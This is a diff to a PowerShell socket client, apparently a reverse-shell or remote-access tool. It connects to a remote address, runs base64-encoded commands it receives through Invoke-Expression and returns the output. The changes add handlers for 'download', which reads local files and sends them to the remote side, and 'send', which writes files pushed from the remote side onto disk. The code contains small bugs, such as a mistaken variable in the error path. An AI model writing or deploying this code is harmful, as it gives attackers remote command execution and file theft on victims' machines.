@@ -1,19 +1,5 @@
 ﻿
 
-function ReceiveFile($receiver,$filename)
-{
-    $bytes = New-Object System.Byte[] 1024
-
-    while(($index = $receiver.Read($bytes,0,$bytes.Length) -ne 0))
-    {
-        $encoding = New-Object System.Text.ASCIIEncoding
-
-        $data     = $encoding.GetString($bytes,0,$index)
-
-        $data | Out-File -Append $filename
-    }
-    return
-}
 function PSClient($addr,$port)
 {
 
@@ -43,28 +29,61 @@ function PSClient($addr,$port)
             #$transmitter.Flush()
 
             $intake      = $receiver.ReadLine()
-            $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
-            $cmd         = $intake
 
-            if($cmd)
+            if($intake)
             {
-                if($cmd | Select-String 'exit')
+                
+                #[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
+
+                if($intake | Select-String 'send')
                 {
-                    $s.Close()
-                    exit
+                    $filename = $intake.Split('#')[1] 
+                    $content  = [System.Convert]::FromBase64String($intake.Split('#')[2])
+                    Set-Content -Path ".\$filename" -Value $content -Encoding Byte
+                    continue
                 }
-                if($cmd | Select-String 'send')
+                if($intake | Select-String 'download')
                 {
-                    $fileName = $cmd.Split(' ')[1] ; WRite-Host $fileName
-                    ReceiveFile $receiver $fileName
+                    $fileName = $intake.Split(' ')[1]
+                    Write-Host "DOWNLOAD"
+                    if(Test-Path $fileName)
+                    {
+                        $filename = Split-Path $filename -leaf
+                        $data = Get-Content $filename -Encoding Byte
+                        $data = [System.Convert]::ToBase64String($data)
+                        $file = "send#$filename#$data"
+                        $transmitter.WriteLine($file)
+                        $transmitter.Flush()
+                    }
+                    else 
+                    {
+                        $response = '[!] Failed to download file '
+                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
+                        $response = [Convert]::ToBase64String($result)
+                        $transmitter.WriteLine($response)
+                        $transmitter.Flush()
+                    }
                 }
                 else 
                 {
-                    $result      = Invoke-Expression $cmd | Out-String 
-                    $result      = [System.Text.Encoding]::Unicode.GetBytes($result)
-                    $result      = [Convert]::ToBase64String($result)
-                    $transmitter.WriteLine($result)
-                    $transmitter.Flush()
+                    if($cmd | Select-String 'exit')
+                    {
+                        $transmitter.Dispose()
+                        $receiver.Dispose()
+                        $s.Close()
+                        exit
+                    }
+                    if($intake -ne $null)
+                    {
+                        $decoded_intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
+                        $cmd                 = $decoded_intake
+                        Write-Host $cmd
+                        $result              = Invoke-Expression $cmd | Out-String 
+                        $result              = [System.Text.Encoding]::Unicode.GetBytes($result)
+                        $result              = [Convert]::ToBase64String($result)
+                        $transmitter.WriteLine($result)
+                        $transmitter.Flush()
+                    }
                 }
             }
     }
